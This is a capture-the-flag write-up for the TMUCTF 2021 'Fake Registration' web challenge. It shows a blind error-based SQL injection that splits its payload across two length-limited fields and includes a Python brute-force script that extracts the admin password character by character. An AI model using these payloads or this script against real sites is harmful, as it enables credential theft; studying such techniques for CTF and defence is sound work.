# Fake Registration

## Problem

Do you think this is really the TMUCTF registration form?!

[Task file](files/fake-registration.zip)

## Solution

We are given source code of a website, at the initialization stage the flag is
set as `admin` password. Also, we can see an obvious SQL-injection:

```python  
...  
sql = f"INSERT INTO `users`(username, password) VALUES ('{username}',
'{password}')"  
...  
db.execute_sql(sql)  
```

Both `username` and `password` aren't sanitized - just user input as-is. There
are two factors that makes this a bit harder to exploit:

 - Both parameters must not be longer than 67 characters  
 - It is blind error-based injection

First one can be bypassed by commenting out values separator, like so:

```  
username=a',(first part of subquery here/*  
password=*/second part of subquery here))--  
```

So we get 134 characters, that is more than enough in this case.

Second one could be exploited using null constraint, which doesn't allow us to
have empty password upon insert. So, we can query password of `admin`
character by character, we get an error on a miss and successfull registration
upon success. This leads to one more nuance: we should generate unique
username as we are actually registering a user upon successfull character
guess. So, we can bruteforce the flag with script like this one:

```python  
import requests  
import string

task_url = "http://task-url"  
alphabet = string.printable;  
curflag = ""  
i = 1  
while True:  
   for alpha in alphabet:  
       username = "a'||random(),(select 1 from users where username='admin' and /*"  
       password = "*/ substr(password,"+str(i)+",1)='"+alpha+"'))--"

       r = requests.post(task_url, data={"username":username,"password":password})  
       response = str(r.content);

       if (response.find('successful') != -1):  
           curflag += alpha  
           print(curflag)  
           i = i + 1  
           break  
```

## TL;DR

- Blind error-based sql-injection  

Original writeup (https://github.com/EvilBunnyWrote/Write-
ups/blob/main/TMUCTF-2021/web/Fake-Registration.md).